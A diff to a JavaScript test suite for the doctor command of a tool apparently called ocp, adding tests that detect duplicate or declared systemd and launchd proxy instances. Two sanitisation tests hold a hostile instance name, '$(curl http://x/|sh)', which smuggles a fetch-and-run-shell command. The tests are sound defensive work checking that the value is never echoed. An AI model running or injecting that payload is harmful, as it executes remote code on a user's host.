@@ -15888,11 +15888,24 @@ test("LOW-3: gatherUnitCandidates — both scopes fail with exit 127 → systemc
   assert.equal(classifyMultiUnitRisk(raw).state, "not-applicable");
 });
 
-test("classifyMultiUnitRisk: two enabled OCP units on DIFFERENT ports → no false positive", () => {
+test("classifyMultiUnitRisk: two enabled OCP units on DIFFERENT ports form no PORT-COLLISION group", () => {
+  // #327 changed this test's FIXTURE, not its point. Its point is the port grouping: distinct
+  // ports can never contend, so they must never produce a port group. That still holds and is
+  // still what is asserted (`groups` — the port groups — must be empty).
+  //
+  // The fixture gained a declaration because the ORIGINAL fixture (two units, neither declaring
+  // anything) is now a finding in its own right: both claim the primary, which is the leftover-
+  // duplicate shape #327 reports. That case gets its own test immediately below, so the widening
+  // is covered rather than absorbed into this one. `declared` is the state name for "≥2 units,
+  // every one distinguishable by both port and identity".
   const userShow = `Id=a.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=3456`;
-  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=9999`;
+  const systemShow = `Id=b.service\nExecStart={ argv[]=/usr/bin/node /home/opc/ocp/server.mjs ; }\nEnvironment=CLAUDE_PROXY_PORT=9999 OCP_INSTANCE_NAME=wifibot`;
   const result = classifyMultiUnitRisk({ platform: "linux", userShowOut: userShow, systemShowOut: systemShow });
-  assert.equal(result.state, "clear", "different ports are never a boot race — only one process can ever hold a given port");
+  assert.equal(result.state, "declared", "different ports are never a boot race — only one process can ever hold a given port");
+  // Non-vacuity premise, asserted positively rather than as the absence of a group: `declared` is
+  // only reachable with TWO units present. Asserting `groups` is empty would be satisfied by
+  // `groups` being undefined, which is also what a dropped candidate would produce.
+  assert.equal(result.units.length, 2, "both units must have been parsed and counted — a verdict reached by silently dropping one would be the same string");
 });
 
 test("MED-7: classifyMultiUnitRisk — two enabled OCP units on the SAME port but DIFFERENT working tree → NOW a WARN (grouping is by port alone)", () => {
@@ -15992,13 +16005,17 @@ function plistBlob(files) {
   return files.map(([path, content]) => `===OCP-DOCTOR-FILE:${path}===\n${content}`).join("\n");
 }
 // runAtLoad: true (default) | false (explicit <false/>) | null (key omitted entirely)
-function ocpPlist({ label, port, bind, runAtLoad = true, serverPath = "/Users/opc/ocp/server.mjs" }) {
+// #327: `instance` emits a normal `<string>…</string>` declaration; `instanceXml` injects a raw
+// fragment so a test can produce the self-closing `<string/>` shape a hand-written plist can
+// carry. Both omitted → no OCP_INSTANCE_NAME key at all, which is a THIRD, distinct state.
+function ocpPlist({ label, port, bind, runAtLoad = true, serverPath = "/Users/opc/ocp/server.mjs", instance, instanceXml }) {
   const runAtLoadXml = runAtLoad === null ? "" : `<key>RunAtLoad</key><${runAtLoad ? "true" : "false"}/>`;
   return runAtLoadXml +
     (label != null ? `<key>Label</key><string>${label}</string>` : "") +
     `<key>ProgramArguments</key><array><string>/usr/bin/node</string><string>${serverPath}</string></array>` +
     (port ? `<key>CLAUDE_PROXY_PORT</key><string>${port}</string>` : "") +
-    (bind ? `<key>CLAUDE_BIND</key><string>${bind}</string>` : "");
+    (bind ? `<key>CLAUDE_BIND</key><string>${bind}</string>` : "") +
+    (instanceXml ? instanceXml : instance !== undefined ? `<key>OCP_INSTANCE_NAME</key><string>${instance}</string>` : "");
 }
 function disabledLaunchctlBlob(entries) {
   const lines = entries.map(([label, disabled]) => `\t"${label}" => ${disabled ? "disabled" : "enabled"}`).join("\n");
@@ -16682,6 +16699,402 @@ test("MED-3: runDoctor on darwin — a maliciously-labeled plist never reaches t
   // Only ONE valid unit remains once the malformed Label is rejected → clear, no WARN at all,
   // so the dangerous string can never appear in doctor's output at all.
   assert.ok(!result.checks.some(c => c.id === "multi_unit_boot_race"));
+});
+
+// ═══════════════════════════════════════════════════════════════════════════
+// Issue #327 — the multi-unit check learns to read OCP_INSTANCE_NAME
+//
+// Before this, multiplicity and duplication were the same observation, so a host running a
+// deliberate second instance and a host carrying a leftover duplicate produced identical output.
+// The declaration (server.mjs's INSTANCE_NAME, /health.instanceName, v3.29.0) is the discriminator.
+//
+// THE ACCEPTANCE CONDITION IS NOT "the warning stops". It is "the warning still fires on
+// undeclared multiplicity, and now only on that" — a change that silenced both cases would be a
+// regression and is the most likely way to get this wrong. Every widening test below is therefore
+// paired with a NO-SILENCING test that pins a shape which warned before #327 and must still warn.
+//
+// The source of truth is the UNIT FILE, never /health: doctor runs before and around a restart,
+// and a leftover duplicate is typically enabled-but-not-running, so the one source that can see
+// the defect is the unit config and the one that cannot is the live endpoint. See the module
+// comment in scripts/doctor.mjs for the full argument.
+// ═══════════════════════════════════════════════════════════════════════════
+console.log("\n#327 — declared second instance vs leftover duplicate (classifyMultiUnitRisk, Linux):");
+
+// One `systemctl show` block. `instance` is three-valued on purpose, matching the three real
+// states the parser must keep apart: undefined → no OCP_INSTANCE_NAME directive at all, "" →
+// the directive present with an empty value, "name" → a declared name.
+function unitShow({ id, port = 3456, instance, tree = "/home/opc/ocp", bind = null, raw = null }) {
+  const env = [`CLAUDE_PROXY_PORT=${port}`];
+  if (bind) env.push(`CLAUDE_BIND=${bind}`);
+  if (raw !== null) env.push(raw);
+  else if (instance !== undefined) env.push(`OCP_INSTANCE_NAME=${instance}`);
+  return `Id=${id}\nExecStart={ argv[]=/usr/bin/node ${tree}/server.mjs ; }\nEnvironment=${env.join(" ")}`;
+}
+const linuxRisk = (userShowOut, systemShowOut) =>
+  classifyMultiUnitRisk({ platform: "linux", userShowOut, systemShowOut });
+
+test("#327: the intended shape — an undeclared primary and a DECLARED second instance on its own port → declared, no warning", () => {
+  // The exact configuration issue #327 describes as correct: primary on 3456, an isolated
+  // instance on 3457 under its own Unix user, declared. This is the false alarm being removed.
+  const result = linuxRisk(
+    unitShow({ id: "ocp.service", port: 3456 }),
+    unitShow({ id: "ocp-wifibot.service", port: 3457, instance: "wifibot" }),
+  );
+  assert.equal(result.state, "declared");
+  assert.equal(result.units.length, 2, "premise: both units were parsed — a dropped unit would also produce no warning");
+  const byName = Object.fromEntries(result.units.map(u => [u.name, u]));
+  assert.equal(byName["ocp-wifibot.service"].instanceName, "wifibot", "the declaration must be read off the unit's Environment=");
+  assert.strictEqual(byName["ocp.service"].instanceName, null, "an absent directive is null, NOT the empty string");
+});
+
+test("#327 (the money test): two enabled units on DIFFERENT ports, NEITHER declared → WARN — the leftover duplicate that used to be invisible", () => {
+  // The defect #327 records: the reporting host carried a genuine leftover duplicate next to the
+  // intended instance, and nothing surfaced it. Different ports, so no boot race — both start,
+  // both bind, and one of them is serving stale code that nobody is looking at.
+  const result = linuxRisk(
+    unitShow({ id: "ocp.service", port: 3456 }),
+    unitShow({ id: "ocp-old.service", port: 3458, tree: "/home/opc/ocp-old" }),
+  );
+  assert.equal(result.state, "warn", "two units both claiming the primary is undeclared multiplicity, whatever their ports");
+  assert.equal(result.groups.length, 0, "and it is NOT a port collision — the ports genuinely differ");
+  assert.equal(result.identityGroups.length, 1);
+  assert.deepEqual(result.identityGroups[0].map(u => u.name).sort(), ["ocp-old.service", "ocp.service"]);
+});
+
+test("#327: two units declaring the SAME name on different ports → WARN — a declaration only resolves anything if it is distinct", () => {
+  const result = linuxRisk(
+    unitShow({ id: "a.service", port: 3457, instance: "wifibot" }),
+    unitShow({ id: "b.service", port: 3458, instance: "wifibot" }),
+  );
+  assert.equal(result.state, "warn", "both units answer to 'wifibot'; the host still cannot say which is which");
+  assert.equal(result.identityGroups.length, 1);
+});
+
+test("#327 NO-SILENCING: a declaration must NOT suppress a port collision — same port, DIFFERENT names still WARNs", () => {
+  // The regression this change is most likely to introduce. Two units cannot share a port no
+  // matter how well they are labelled, so the port analysis is computed before and independently
+  // of any name. A fix that let a name silence this would trade one false alarm for a real one.
+  const result = linuxRisk(
+    unitShow({ id: "a.service", port: 3456, instance: "", bind: "127.0.0.1" }),
+    unitShow({ id: "b.service", port: 3456, instance: "wifibot", bind: "0.0.0.0" }),
+  );
+  assert.equal(result.state, "warn");
+  assert.equal(result.groups.length, 1, "the port-collision group must still form");
+  assert.equal(result.groups[0].length, 2);
+});
+
+test("#327 NO-SILENCING: the issue #215 field incident is unchanged — one port-collision finding, and the identity overlap is NOT reported twice", () => {
+  // Both field-incident units are undeclared, so they also collide on identity. That is one
+  // hazard with two descriptions, and the port collision is the more urgent and specific of the
+  // two — reporting both would train the reader to skim, which is the disease #327 is about.
+  const result = classifyMultiUnitRisk({
+    platform: "linux",
+    userShowOut: FIELD_INCIDENT_USER_SHOW,
+    systemShowOut: FIELD_INCIDENT_SYSTEM_SHOW,
+  });
+  assert.equal(result.state, "warn");
+  assert.equal(result.groups.length, 1, "still exactly one port-collision group");
+  assert.equal(result.identityGroups.length, 0, "the identity group is wholly inside the port group — suppressed as a duplicate description");
+});
+
+test("#327: PARTIAL overlap is two findings, not one — a port collision among three units that ALL claim the primary", () => {
+  // The containment rule drops an identity group only when it is entirely inside ONE port group.
+  // Here it is not: fixing the 3456 collision still leaves an ambiguous host, so the operator
+  // must be told both things. Guards the difference between `every(...)` and "any member shared".
+  const result = classifyMultiUnitRisk({
+    platform: "linux",
+    userShowOut: `${unitShow({ id: "a.service", port: 3456 })}\n\n${unitShow({ id: "b.service", port: 3456 })}`,
+    systemShowOut: unitShow({ id: "c.service", port: 3458, tree: "/home/opc/ocp-old" }),
+  });
+  assert.equal(result.state, "warn");
+  assert.equal(result.groups.length, 1, "a.service and b.service still collide on 3456");
+  assert.equal(result.identityGroups.length, 1, "and all THREE claim the primary — a finding the port group does not cover");
+  assert.equal(result.identityGroups[0].length, 3);
+});
+
+console.log("\n#327 — 'absent' and 'explicitly empty' are the same CLAIM but not the same OBSERVATION:");
+
+test("#327: an ABSENT directive and an EXPLICITLY EMPTY one collide (same claim: 'I am the primary')", () => {
+  // README defines an empty OCP_INSTANCE_NAME as the primary and requires only the SECOND
+  // instance to declare itself, so absence IS a claim to be the primary — not "nothing to
+  // compare". A branch that skipped the comparison when the operand was missing would be a
+  // predicate satisfied by an absence, which is the defect shape AGENTS.md/#371 records.
+  const result = linuxRisk(
+    unitShow({ id: "a.service", port: 3456 }),                 // no directive at all
+    unitShow({ id: "b.service", port: 3458, instance: "" }),   // directive present, empty
+  );
+  assert.equal(result.state, "warn", "two claims to be the primary is unresolved regardless of which spelling each used");
+  assert.equal(result.identityGroups.length, 1);
+});
+
+test("#327: ...but the two are still DISTINGUISHABLE in the parsed model and in the message", () => {
+  // The fold above is for the distinctness test ONLY. The operator's next move differs, and
+  // rendering an absence as `OCP_INSTANCE_NAME=""` would assert a directive nobody wrote.
+  const result = linuxRisk(
+    unitShow({ id: "a.service", port: 3456 }),
+    unitShow({ id: "b.service", port: 3458, instance: "" }),
+  );
+  // STATE FIRST, THEN DEREFERENCE — the discipline stated in full at the SPACE test below, and
+  // applied to every test in this block that reads `result.units`. `groupAndAssessConflicts`
+  // returns `{ state: "clear" }` with NO `units`, so a regression routing this fixture there
+  // would otherwise surface as `Cannot read properties of undefined (reading 'map')`: a real
+  // detection wearing the name of a JavaScript property instead of the name of the defect.
+  assert.equal(result.state, "warn", "premise: both units are present and both claim the primary");
+  const byName = Object.fromEntries(result.units.map(u => [u.name, u]));
+  assert.strictEqual(byName["a.service"].instanceName, null, "absent must be null");
+  assert.strictEqual(byName["b.service"].instanceName, "", "explicitly empty must be the empty string, not null");
+  assert.notStrictEqual(byName["a.service"].instanceName, byName["b.service"].instanceName,
+    "if these ever become the same value the message can no longer tell an operator which file they edited");
+});
+
+test("#327: a whitespace-only declaration trims to the primary — the check models what server.mjs's INSTANCE_NAME will actually do", () => {
+  // server.mjs's INSTANCE_NAME is `(process.env.OCP_INSTANCE_NAME || "").trim()`. A unit declaring a blank
+  // value produces an instance whose /health says `instanceName: ""` — the primary. Reading the
+  // file literally instead would let a unit look declared while the running process is not.
+  const result = linuxRisk(
+    unitShow({ id: "a.service", port: 3456 }),
+    unitShow({ id: "b.service", port: 3458, raw: '"OCP_INSTANCE_NAME=   "' }),
+  );
+  // State first, then dereference — see the SPACE test below.
+  assert.equal(result.state, "warn", "so it claims the primary, and collides with the undeclared unit");
+  const b = result.units.find(u => u.name === "b.service");
+  assert.strictEqual(b.instanceName, "", "must trim to empty, exactly as the server will");
+});
+
+test("#327: a declared name CONTAINING A SPACE is read whole (systemd quotes the whole KEY=VALUE pair)", () => {
+  // `systemctl show -p Environment` renders `Environment="A=b c" D=e`. Reading only up to the
+  // first space would truncate "wifi bot" to "wifi" — two units named "wifi bot" and "wifi cat"
+  // would then collide on the truncation and be reported as a duplicate that does not exist.
+  const result = linuxRisk(
+    unitShow({ id: "a.service", port: 3457, raw: '"OCP_INSTANCE_NAME=wifi bot"' }),
+    unitShow({ id: "b.service", port: 3458, raw: '"OCP_INSTANCE_NAME=wifi cat"' }),
+  );
+  // ── STATE FIRST, THEN DEREFERENCE (the discipline for this whole block) ──
+  // `units` exists only on the `declared` and `warn` shapes, so reading it before asserting the
+  // state turns a state regression into `Cannot read properties of undefined` — a real detection
+  // with a message that names a JavaScript property instead of the defect. Found by mutation M11
+  // (`declared` collapsed back to `clear`), which is the one mutation that reaches this test
+  // through a shape carrying no `units` at all.
+  //
+  // #399's independent review found this file teaching TWO disciplines: this comment said one
+  // thing and five neighbouring tests did the opposite. It measured the hazard as not currently
+  // reachable in those five — under M1 their fixtures land in `declared`, which does carry
+  // `units` — and that is precisely why it needed fixing rather than not: an inconsistency with
+  // no failing test is the kind the next author resolves by copying whichever neighbour they
+  // landed next to. All five now assert state first.
+  assert.equal(result.state, "declared", "two genuinely distinct names must not be collapsed by a truncating parse");
+  const byName = Object.fromEntries(result.units.map(u => [u.name, u]));
+  assert.equal(byName["a.service"].instanceName, "wifi bot");
+  assert.equal(byName["b.service"].instanceName, "wifi cat");
+});
+
+test("#327: a LONGER key ending in the same letters is not mistaken for the declaration", () => {
+  const result = linuxRisk(
+    unitShow({ id: "a.service", port: 3456 }),
+    unitShow({ id: "b.service", port: 3458, raw: "MY_OCP_INSTANCE_NAME=wifibot" }),
+  );
+  // State first, then dereference — see the SPACE test above.
+  assert.equal(result.state, "warn", "and so it still claims the primary alongside a.service");
+  const b = result.units.find(u => u.name === "b.service");
+  assert.strictEqual(b.instanceName, null, "MY_OCP_INSTANCE_NAME is a different variable — b.service declares nothing");
+});
+
+test("#327 trust boundary: a hostile OCP_INSTANCE_NAME is never echoed, but STILL groups — sanitizing must not silence", () => {
+  // Unlike UNIT_NAME_RE / LAUNCHD_LABEL_RE, which reject the whole candidate, a bad instance name
+  // may only be withheld from the RENDERING: dropping the candidate would let an attacker (or a
+  // typo) hide a duplicate unit by writing a weird string into a file.
+  // Quote-free on purpose: systemd escapes an embedded `"` when it renders `Environment=`, so a
+  // quote is the ONE hostile character that cannot arrive intact. `$(...)` can, and is enough.
+  const hostile = "$(curl http://x/|sh)";
+  const result = linuxRisk(
+    unitShow({ id: "a.service", port: 3457, raw: `"OCP_INSTANCE_NAME=${hostile}"` }),
+    unitShow({ id: "b.service", port: 3458, raw: `"OCP_INSTANCE_NAME=${hostile}"` }),
+  );
+  // State first, then dereference — see the SPACE test above. Note the ORDER of the next two is
+  // load-bearing in the other direction: state is asserted first because it makes `units` safe to
+  // read, but the PREMISE must still be the assertion that fires under M6 (quoted parse form
+  // dropped). It is: under M6 neither name parses, so both units claim the primary and the state
+  // is STILL `warn` — the state assertion passes and the premise is what goes red. That is the
+  // whole point of the premise, and moving the state check ahead of it does not blunt it.
+  assert.equal(result.state, "warn", "the duplicate must still be detected — the raw value is what is compared");
+  const byName = Object.fromEntries(result.units.map(u => [u.name, u]));
+  assert.equal(byName["a.service"].instanceName, hostile,
+    "premise: the raw value really did survive parsing — if it were truncated here, the assertions below would pass for the wrong reason");
+  assert.equal(result.identityGroups.length, 1);
+});
+
+console.log("\n#327 — launchd (macOS) reads the same declaration out of the plist:");
+
+test("#327 (macOS): an undeclared primary plist plus a DECLARED second instance on its own port → declared, no warning", () => {
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.wifibot.plist", ocpPlist({ label: "dev.ocp.wifibot", port: "3457", instance: "wifibot" })],
+  ]);
+  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
+  assert.equal(result.state, "declared");
+  assert.equal(result.units.length, 2, "premise: both plists were parsed");
+  assert.equal(result.units.find(u => u.name === "dev.ocp.wifibot").instanceName, "wifibot");
+});
+
+test("#327 (macOS): two plists on different ports, neither declared → WARN", () => {
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
+    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3458" })],
+  ]);
+  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
+  assert.equal(result.state, "warn");
+  assert.equal(result.identityGroups.length, 1);
+});
+
+test("#327 (macOS): a SELF-CLOSING <string/> is a declaration whose value is empty, distinct from an absent key", () => {
+  // plutil writes `<string></string>`; a hand-written plist may carry `<string/>`. Matching only
+  // the first would report a declared primary as undeclared — the same absent-vs-empty collapse
+  // the Linux side guards, in the shape launchd can produce.
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/a.plist", ocpPlist({ label: "a", port: "3456" })],
+    ["/Users/opc/Library/LaunchAgents/b.plist", ocpPlist({ label: "b", port: "3458", instanceXml: "<key>OCP_INSTANCE_NAME</key><string/>" })],
+  ]);
+  const result = classifyMultiUnitRisk({ platform: "darwin", plistBlob: blob });
+  // State first, then dereference — see the SPACE test above.
+  assert.equal(result.state, "warn", "both still claim the primary");
+  const byName = Object.fromEntries(result.units.map(u => [u.name, u]));
+  assert.strictEqual(byName["a"].instanceName, null, "no key at all → null");
+  assert.strictEqual(byName["b"].instanceName, "", "a self-closing <string/> → the empty string, not null");
+});
+
+console.log("\n#327 — full pipeline via runDoctor:");
+
+const doctor327 = (extra) => runDoctor({
+  skipNetwork: false,
+  mockVersion: "v3.29.2",
+  mockLatest: "v3.29.2",
+  mockHealth: { status: 200, body: { version: "3.29.2", auth: { ok: true } } },
+  ...extra,
+});
+const linuxRun = (userShow, systemShow) => (cmd) => {
+  if (cmd.includes("--user list-unit-files")) return "u.service enabled\n";
+  if (cmd.includes("list-unit-files")) return "s.service enabled\n";
+  if (cmd.includes("--user show")) return userShow;
+  if (cmd.includes("systemctl show")) return systemShow;
+  throw new Error("unexpected: " + cmd);
+};
+
+test("#327 runDoctor: a correctly-declared two-instance host gets an INFO inventory, not a WARN — and the upgrade is not impeded", async () => {
+  const result = await doctor327({
+    mockPlatform: "linux",
+    run: linuxRun(
+      unitShow({ id: "ocp.service", port: 3456 }),
+      unitShow({ id: "ocp-wifibot.service", port: 3457, instance: "wifibot" }),
+    ),
+  });
+  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
+  assert.ok(check, "silence would be indistinguishable from 'nothing looked' — the issue asks for the positive report by name");
+  assert.equal(check.level, "INFO", "a correct configuration must not be warned at, which is the whole point of #327");
+  assert.ok(check.message.includes("3456") && check.message.includes("3457"), `message must enumerate the instances; got: ${check.message}`);
+  assert.ok(check.message.includes("wifibot"), "and name the declared one");
+  assert.ok(check.message.includes("primary"), "and identify the undeclared one as the primary");
+  assert.equal(result.warn_count, 0, "INFO must not be counted as a warning");
+  assert.equal(result.ready_to_upgrade, true);
+});
+
+test("#327 runDoctor (the money test): a leftover duplicate on its own port WARNs, names both units, and offers both remedies", async () => {
+  const result = await doctor327({
+    mockPlatform: "linux",
+    run: linuxRun(
+      unitShow({ id: "ocp.service", port: 3456 }),
+      unitShow({ id: "ocp-old.service", port: 3458, tree: "/home/opc/ocp-old" }),
+    ),
+  });
+  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
+  assert.ok(check, "expected the check to fire on undeclared multiplicity");
+  assert.equal(check.level, "WARN", "must be WARN, never FAIL — a FAIL would block every future `ocp update` on this host");
+  assert.ok(check.message.includes("ocp.service") && check.message.includes("ocp-old.service"), "message must name BOTH units");
+  assert.ok(check.message.includes("3456") && check.message.includes("3458"), "and both ports, so the operator can tell them apart");
+  assert.ok(check.message.includes("OCP_INSTANCE_NAME"), "must name the declaration as the first remedy — nothing is lost by declaring");
+  assert.ok(check.message.includes("systemctl --user disable ocp.service"), "and offer the user-scope unit's disable command");
+  assert.ok(check.message.includes("systemctl disable ocp-old.service"), "and the system-scope one's — neither is nominated over the other");
+  assert.ok(!check.message.includes("boot race"), "must NOT be worded as a boot race: these units do not contend for a port, which is exactly why the failure is quiet");
+  assert.equal(result.ready_to_upgrade, true, "a WARN must not flip ready_to_upgrade — runUpgrade() only tolerates false for fresh_install");
+});
+
+test("#327 runDoctor NO-SILENCING: a same-port collision between two DECLARED units still WARNs, worded as the boot race it is", async () => {
+  const result = await doctor327({
+    mockPlatform: "linux",
+    run: linuxRun(
+      unitShow({ id: "ocp.service", port: 3456, instance: "", bind: "0.0.0.0" }),
+      unitShow({ id: "ocp-wifibot.service", port: 3456, instance: "wifibot", bind: "127.0.0.1" }),
+    ),
+  });
+  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
+  assert.ok(check, "a declaration must never buy silence on a port collision");
+  assert.equal(check.level, "WARN");
+  assert.ok(check.message.includes("boot race"), "same port IS the boot race — the wording must stay");
+  assert.ok(check.message.includes('OCP_INSTANCE_NAME="" (the primary)') && check.message.includes('OCP_INSTANCE_NAME="wifibot"'),
+    `the port-collision message should now also carry each unit's declaration; got: ${check.message}`);
+});
+
+test("#327 runDoctor (macOS): the undeclared-multiplicity remedy is a plist edit and NEVER a systemctl command", async () => {
+  const blob = plistBlob([
+    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
+    ["/Library/LaunchDaemons/ai.custom.ocp.plist", ocpPlist({ label: "ai.custom.ocp", port: "3458" })],
+  ]);
+  const result = await doctor327({
+    mockPlatform: "darwin",
+    run: (cmd) => {
+      if (cmd.includes("for f in")) return blob;
+      if (cmd.includes("print-disabled")) return disabledLaunchctlBlob([["dev.ocp.proxy", false], ["ai.custom.ocp", false]]);
+      throw new Error("unexpected: " + cmd);
+    },
+  });
+  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
+  assert.ok(check);
+  assert.equal(check.level, "WARN");
+  assert.ok(!check.message.includes("systemctl"), "systemctl does not exist on macOS — MED-3.3's lesson applies to the new message too");
+  assert.ok(check.message.includes("EnvironmentVariables"), "must point at the plist's own mechanism for declaring");
+  assert.ok(check.message.includes("sudo launchctl disable system/ai.custom.ocp"), "and render the LaunchDaemon's real disable command");
+});
+
+test("#327 runDoctor trust boundary: a hostile OCP_INSTANCE_NAME is detected but never reaches the operator's terminal verbatim", async () => {
+  const hostile = "$(curl http://x/|sh)";
+  const result = await doctor327({
+    mockPlatform: "linux",
+    run: linuxRun(
+      unitShow({ id: "a.service", port: 3457, raw: `"OCP_INSTANCE_NAME=${hostile}"` }),
+      unitShow({ id: "b.service", port: 3458, raw: `"OCP_INSTANCE_NAME=${hostile}"` }),
+    ),
+  });
+  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
+  assert.ok(check, "the duplicate must still be found — withholding the name must not withhold the finding");
+  assert.equal(check.level, "WARN");
+  assert.ok(!check.message.includes("curl http://x/"), "README's own guidance is to hand this output to an AI agent");
+  assert.ok(check.message.includes("not echoed"), "and say plainly that a value was withheld rather than silently dropping it");
+});
+
+test("#327 runDoctor: a name containing a SPACE is parsed whole but still withheld from the message — parsing and echoing answer different questions", async () => {
+  // #399 review, INFO (a): the PR goes out of its way to read `wifi bot` WHOLE, and then
+  // SAFE_INSTANCE_NAME_RE — an allowlist that excludes the space — refuses to echo it. That looks
+  // like an inconsistency and is not one, but nothing covered it, so the pairing could have been
+  // broken in either direction without a test noticing. Parsing whole is CORRECTNESS (truncating
+  // to "wifi" invents a collision between units that do not collide); withholding is TRUST (a
+  // space is the cheapest separator for smuggling an argument past a skimming reader).
+  const spaced = "wifi bot";
+  const result = await doctor327({
+    mockPlatform: "linux",
+    run: linuxRun(
+      unitShow({ id: "a.service", port: 3457, raw: `"OCP_INSTANCE_NAME=${spaced}"` }),
+      unitShow({ id: "b.service", port: 3458, raw: `"OCP_INSTANCE_NAME=${spaced}"` }),
+    ),
+  });
+  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
+  // Premise, asserted before the redaction claim: the finding exists at all. Two units sharing a
+  // name is what makes this a WARN, and it is only reachable if BOTH names parsed whole — a parse
+  // that truncated at the space would still produce two equal claims ("wifi"), so the premise that
+  // actually distinguishes it is the "not echoed" marker below, which only the sanitizer writes.
+  assert.ok(check, "the shared-name finding must still fire");
+  assert.equal(check.level, "WARN");
+  assert.ok(check.message.includes("not echoed"), "premise: the value reached the sanitizer and was withheld — without this the next assertion passes vacuously whenever the name never parsed");
+  assert.ok(!check.message.includes(spaced), "a space-containing name must not be echoed, however printable its characters are");
+  assert.ok(check.message.includes("safe label set"), "and the message must name the set, so a withheld value is actionable rather than mysterious");
 });
 
 console.log("\nocp `cmd_update` doctor-check surfacing (issue #220, MED-5 recurrence):");
